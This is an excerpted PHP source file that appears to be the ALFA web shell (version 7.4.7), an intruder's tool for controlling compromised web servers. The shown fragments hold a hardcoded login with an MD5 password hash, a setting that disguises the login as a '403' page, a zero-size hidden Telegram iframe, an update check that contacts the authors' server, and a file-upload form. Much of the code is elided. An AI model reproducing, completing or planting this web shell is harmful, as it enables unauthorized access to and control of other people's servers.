...
/*
	Author: 	4lph4Team
	Telegram: 	https://t.me/ALPH4Co
	YouTube: 	https://www.youtube.com/@4lph4co
	Site:		https://4lph4.ir/
	Date:		Monday, September 14, 2020
*/
$GLOBALS['oZgNypoPRU'] = array(
	'username' => 'alfa',
	'password' => '4708dd1b1ffef489ed54ae894d198607', //md5(sobhan & amir)
	'safe_mode' => '0',
	'login_page' => '403',
	'show_icons' => '1',
...
define("__ALFA_VERSION__", "7.4.7");
define("__ALFA_UPDATE__", "3");
define("__ALFA_CODE_NAME__", "Grom");
...
<center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="https://github.com/sobhan-azimzadeh/alphashell-pathcord/blob/main/302.png" /></center>
...
<td width="50%" rowspan="8"><img style="border-radius:10px;" width="180" height="80" alt="alfa team 2024" draggable="false" src="https://4lph4.ir/wp-content/uploads/2024/09/319.png" /></td>
</tr>
<tr>
...
function __showicon($r)
{
	...
	$s['alfamini'] = 'https://4lph4.ir/wp-content/uploads/2024/09/cropped-001-2-1-32x32.png';
	$s['loader'] = 'https://4lph4.ir/wp-content/uploads/2024/09/319.png';
...
function alfaaboutus()
{
	...
	$about_us = $news->Send("/");
	if (empty($about_us)) {
		$about_us = "<pre><center><img width='250px' height='250px'src='https://4lph4.ir/wp-content/uploads/2024/09/cropped-001-2-1.png'><br>
<b><font size='+3' color='#00A220'>&#9774; ~ 4LPH4 ~ &#9774;</font><br><b>
<font color='#00A220'>Shell Coded By Sobhan532 & Amir747 (ALFA TEaM)</font><br>
<font color='#00A220'>github : https://github.com/4lph4shell</font><br>
<font color='#00A220'>Telegram Channel: https://t.me/ALPH4Co</font><br>
<font color='#FFFFFF'>You tube : https://www.youtube.com/@4lph4co</font><br>
<font color='#FFFFFF'>site : https://4lph4.ir/</font><br>
<font color='#FF0000'>Persian wolf For Ever</font><br>
<font color='#FF0000'>Iranian Programmers</font><br>
<font color='#FF0000'>############</font><br>
</center></pre><iframe src='tg://resolve?domain=ALPH4Co' frameborder='0' width='0' height='0'></iframe>";
	}
	echo __pre() . $about_us;
	echo ('</div>');
	alfafooter();
...
function alfacheckupdate()
{
	...
	if (function_exists("curl_version")) {
		...
		if ($json) {
			...
			if (isset($json["4lph4co"]) && !empty($json["4lph4co"])) {
				$data["4lph4co"] = $json["4lph4co"];
			}
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[git [at] 4lph4shell  &copy; 2012-" . date('Y') . " ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"BTC: 1KLty8LUqnqsXkM3Qkvy2Kpv4gLt7Ugcyo\");' style='color: #E91E63;text-decoration: none;'>Donate Us !</a></span>  <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://t.me/ALPH4Co'>@4lph4co</a></span></div></td>
</tr>
</table>
</div>
...
function findicon($file, $type)
{
	...
	if ($type != 'file') {
		return ($file == '..' ? $s . 'back.png' : $s . 'menu/folder2.svg');
	} else {
		$ext = explode('.', $file);
		$ext = end($ext);
		$ext = strtolower($ext);
